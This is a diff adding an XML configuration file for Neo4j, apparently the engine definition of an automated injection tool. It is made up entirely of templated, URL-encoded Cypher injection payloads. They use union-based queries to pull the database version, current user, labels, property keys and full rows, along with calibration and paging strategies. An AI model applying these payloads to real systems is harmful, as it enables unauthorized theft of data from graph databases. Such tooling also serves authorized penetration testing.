@@ -1,0 +1,104 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<model>
+    <vendor></vendor>
+    <resource>
+        <info>
+'a'as A limit 0 union 
+MATCH (n)
+RETURN distinct 
+'${LEAD}' 
+%2b 'version'
+%2b '${ENCLOSE_VALUE_SQL}' 
+%2b 'database()' 
+%2b '${ENCLOSE_VALUE_SQL}' 
+%2b 'current_user()' 
+%2b '${TRAIL_SQL}'
+        </info>
+        <schema>
+            <database>
+'a'as A limit 0 union
+MATCH (n)
+RETURN distinct '${LEAD}' 
+%2b '${ENCLOSE_VALUE_SQL}neo4j${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+ AS A
+{limit}
+union match (n:aze) return 'a'
+            </database>
+            <table>
+'a'as A limit 0 union
+CALL db.labels() 
+YIELD label 
+RETURN 
+    '${LEAD}' 
+%2b reduce(
+        totalAge = '', 
+        n in collect(label) | 
+        totalAge 
+        %2b '${ENCLOSE_VALUE_SQL}'
+        %2b n 
+        %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+    ) 
+%2b '${TRAIL_SQL}'
+ AS A
+{limit}
+union match (n:aze) return 'a'
+            </table>
+            <column>
+'a'as A limit 0 union
+MATCH (n:${TABLE}) 
+with collect(keys(n)) as attr 
+unwind attr as r 
+with distinct r[0] as d 
+order by d 
+return 
+    '${LEAD}' 
+%2b reduce(
+        totalAge = '', 
+        n in collect(d) | 
+        totalAge 
+        %2b '${ENCLOSE_VALUE_SQL}'
+        %2b n
+        %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+    ) 
+%2b '${TRAIL_SQL}'
+ AS A
+{limit}
+union match (n:aze) return 'a'
+            </column>
+            <row>
+                <query>
+'a'as A limit 0 union
+MATCH (n:${TABLE}) RETURN '${LEAD}' 
+%2b 
+reduce(totalAge = "", n in collect(n) | totalAge %2b 
+ '${ENCLOSE_VALUE_SQL}'
+        %2b ${FIELDS}
+        %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+)
+%2b '${TRAIL_SQL}'
+ AS A
+{limit}
+union match (n:aze) return 'a'
+                </query>
+                <fields>
+                    <field>coalesce(n.${FIELD},"")</field>
+                    <concat>%2b '%7f' %2b</concat>
+                </fields>
+            </row>
+        </schema>
+    </resource>
+    <strategy>
+        <configuration>
+            <slidingWindow>${INJECTION}</slidingWindow>
+            <limit>skip ${LIMIT} limit 1</limit>
+            <failsafe>MATCH (n) RETURN 1337${INDICE}7330%2b1 AS A</failsafe>
+            <calibrator>'a'as A limit 0 union MATCH (n) RETURN '${LEAD}${INDICE}' %2b reduce(a = "", nn in collect(n) | a %2b "${CALIBRATOR_SQL}")</calibrator>
+            <limitBoundary>0</limitBoundary>
+        </configuration>
+        <normal>
+            <indices>RETURN 'A' AS A union ${INDICES}</indices>
+            <capacity>${CALIBRATOR}</capacity>
+            <orderBy>order by 1337</orderBy>
+        </normal>
+    </strategy>
+</model>
